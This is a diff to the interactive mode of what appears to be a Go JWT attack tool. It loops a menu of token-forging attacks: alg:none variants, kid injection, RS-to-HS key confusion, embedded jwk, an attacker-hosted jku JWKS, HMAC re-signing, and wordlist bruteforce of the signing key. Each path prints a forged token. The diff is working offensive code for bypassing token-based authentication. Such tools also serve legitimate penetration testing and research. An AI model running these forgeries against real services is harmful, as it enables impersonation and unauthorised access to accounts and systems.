@@ -68,133 +68,138 @@ func runInteractive() {
 	}
 	raw = strings.TrimSpace(raw)
 
-	// 2. Parse + detected algorithm
-	tok, err := jwt.Parse(raw)
-	if err != nil {
-		fmt.Println("[!]", err)
-		return
-	}
-	if alg, ok := tok.Header["alg"].(string); ok {
-		fmt.Printf("[+] Algorithm detected: %s\n\n", alg)
-	}
+	// 2. Loop: run attacks and keep returning to the menu until "quit".
+	for {
+		// Parse fresh each round so every attack starts from the original token.
+		tok, err := jwt.Parse(raw)
+		if err != nil {
+			fmt.Println("[!]", err)
+			return
+		}
+		alg, _ := tok.Header["alg"].(string)
+		fmt.Printf("\n[+] Algorithm detected: %s\n", alg)
 
-	// 3. Attack menu (arrow keys)
-	var choice string
-	if err := ask(&survey.Select{
-		Message: "Choose an attack:",
-		Options: []string{
-			"analyse (inspect)",
-			"alg:none",
-			"kid injection",
-			"confusion RS->HS",
-			"jwk embedded",
-			"jku hosted",
-			"HMAC (known key)",
-			"bruteforce (wordlist)",
-		},
-	}, &choice); err != nil {
-		fmt.Println("[!]", err)
-		return
-	}
+		// Attack menu (arrow keys)
+		var choice string
+		if err := ask(&survey.Select{
+			Message: "Choose an attack:",
+			Options: []string{
+				"analyse (inspect)",
+				"alg:none",
+				"kid injection",
+				"confusion RS->HS",
+				"jwk embedded",
+				"jku hosted",
+				"HMAC (known key)",
+				"bruteforce (wordlist)",
+				"quit",
+			},
+		}, &choice); err != nil {
+			fmt.Println("[!]", err)
+			return
+		}
+		if choice == "quit" {
+			return
+		}
 
-	// analyse = read-only, no forging
-	if choice == "analyse (inspect)" {
-		fmt.Println()
-		prettyHeader, _ := json.MarshalIndent(tok.Header, "", "  ")
-		prettyBody, _ := json.MarshalIndent(tok.Payload, "", "  ")
-		printSection("HEADER")
-		fmt.Println(string(prettyHeader))
-		printSection("PAYLOAD")
-		fmt.Println(string(prettyBody))
-		printSection("SIGNATURE")
-		fmt.Println(tok.Parts[2])
-		return
-	}
+		// analyse = read-only, no forging -> back to the menu
+		if choice == "analyse (inspect)" {
+			fmt.Println()
+			prettyHeader, _ := json.MarshalIndent(tok.Header, "", "  ")
+			prettyBody, _ := json.MarshalIndent(tok.Payload, "", "  ")
+			printSection("HEADER")
+			fmt.Println(string(prettyHeader))
+			printSection("PAYLOAD")
+			fmt.Println(string(prettyBody))
+			printSection("SIGNATURE")
+			fmt.Println(tok.Parts[2])
+			continue
+		}
 
-	// 4. Fields to modify (same as --set)
-	askFields(tok.Payload)
+		// Fields to modify (same as --set)
+		askFields(tok.Payload)
 
-	// 5. Dispatch based on the chosen attack
-	alg, _ := tok.Header["alg"].(string)
-	o := forge.Options{Alg: alg}
-	var forged string
+		// Dispatch based on the chosen attack
+		o := forge.Options{Alg: alg}
+		var forged string
 
-	switch choice {
-	case "alg:none":
-		fmt.Println("\n[+] alg:none variants:")
-		for _, v := range []string{"none", "None", "NONE", "nOnE"} {
-			o.Alg = v
-			t, e := forge.None(tok.Header, tok.Payload, o)
+		switch choice {
+		case "alg:none":
+			fmt.Println("\n[+] alg:none variants:")
+			for _, v := range []string{"none", "None", "NONE", "nOnE"} {
+				o.Alg = v
+				t, e := forge.None(tok.Header, tok.Payload, o)
+				if e != nil {
+					fmt.Println("[!]", e)
+					break
+				}
+				fmt.Printf("  [%s] %s\n", v, t)
+			}
+			continue
+
+		case "kid injection":
+			var kid, key string
+			ask(&survey.Input{Message: "kid value:"}, &kid)
+			ask(&survey.Input{Message: "key (empty = /dev/null):"}, &key)
+			key, _ = resolveValue(key)
+			o.Kid, o.Key = kid, key
+			forged, err = forge.Kid(tok.Header, tok.Payload, o)
+
+		case "confusion RS->HS":
+			var pub string
+			ask(&survey.Input{Message: "public key file (PEM):"}, &pub)
+			data, e := os.ReadFile(pub)
 			if e != nil {
 				fmt.Println("[!]", e)
-				return
+				continue
 			}
-			fmt.Printf("  [%s] %s\n", v, t)
+			o.Key = string(data)
+			forged, err = forge.Confusion(tok.Header, tok.Payload, o)
+
+		case "jwk embedded":
+			forged, err = forge.JWK(tok.Header, tok.Payload, o)
+
+		case "jku hosted":
+			var url string
+			ask(&survey.Input{Message: "attacker JWKS URL:"}, &url)
+			o.JkuURL = url
+			var jwks string
+			forged, jwks, err = forge.JKU(tok.Header, tok.Payload, o)
+			if err == nil {
+				fmt.Printf("\n[*] Host this JWKS at %s :\n%s\n", url, jwks)
+			}
+
+		case "HMAC (known key)":
+			var key string
+			ask(&survey.Input{Message: "key (or @file):"}, &key)
+			key, _ = resolveValue(key)
+			o.Key = key
+			forged, err = forge.HMAC(tok.Header, tok.Payload, o)
+
+		case "bruteforce (wordlist)":
+			var wl string
+			ask(&survey.Input{Message: "wordlist file:"}, &wl)
+			found, e := attack.BruteforceKey(tok.Parts, wl, runtime.NumCPU(), alg)
+			if e != nil {
+				fmt.Println("[!]", e)
+				continue
+			}
+			if found == "" {
+				fmt.Println("[!] no key found in the wordlist")
+				continue
+			}
+			fmt.Println("[+] Key found:", found)
+			o.Key = found
+			forged, err = forge.HMAC(tok.Header, tok.Payload, o)
 		}
-		return
 
-	case "kid injection":
-		var kid, key string
-		ask(&survey.Input{Message: "kid value:"}, &kid)
-		ask(&survey.Input{Message: "key (empty = /dev/null):"}, &key)
-		key, _ = resolveValue(key)
-		o.Kid, o.Key = kid, key
-		forged, err = forge.Kid(tok.Header, tok.Payload, o)
-
-	case "confusion RS->HS":
-		var pub string
-		ask(&survey.Input{Message: "public key file (PEM):"}, &pub)
-		data, e := os.ReadFile(pub)
-		if e != nil {
-			fmt.Println("[!]", e)
-			return
+		if err != nil {
+			fmt.Println("[!]", err)
+			continue
 		}
-		o.Key = string(data)
-		forged, err = forge.Confusion(tok.Header, tok.Payload, o)
-
-	case "jwk embedded":
-		forged, err = forge.JWK(tok.Header, tok.Payload, o)
-
-	case "jku hosted":
-		var url string
-		ask(&survey.Input{Message: "attacker JWKS URL:"}, &url)
-		o.JkuURL = url
-		var jwks string
-		forged, jwks, err = forge.JKU(tok.Header, tok.Payload, o)
-		if err == nil {
-			fmt.Printf("\n[*] Host this JWKS at %s :\n%s\n", url, jwks)
-		}
-
-	case "HMAC (known key)":
-		var key string
-		ask(&survey.Input{Message: "key (or @file):"}, &key)
-		key, _ = resolveValue(key)
-		o.Key = key
-		forged, err = forge.HMAC(tok.Header, tok.Payload, o)
-
-	case "bruteforce (wordlist)":
-		var wl string
-		ask(&survey.Input{Message: "wordlist file:"}, &wl)
-		found, e := attack.BruteforceKey(tok.Parts, wl, runtime.NumCPU(), alg)
-		if e != nil {
-			fmt.Println("[!]", e)
-			return
-		}
-		if found == "" {
-			fmt.Println("[!] no key found in the wordlist")
-			return
-		}
-		fmt.Println("[+] Key found:", found)
-		o.Key = found
-		forged, err = forge.HMAC(tok.Header, tok.Payload, o)
+		fmt.Println("\n[+] Forged token:")
+		fmt.Println(forged)
 	}
-
-	if err != nil {
-		fmt.Println("[!]", err)
-		return
-	}
-	fmt.Println("\n[+] Forged token:")
-	fmt.Println(forged)
 }
 
 // askFields prompts for field modifications (key=value) until an empty entry.
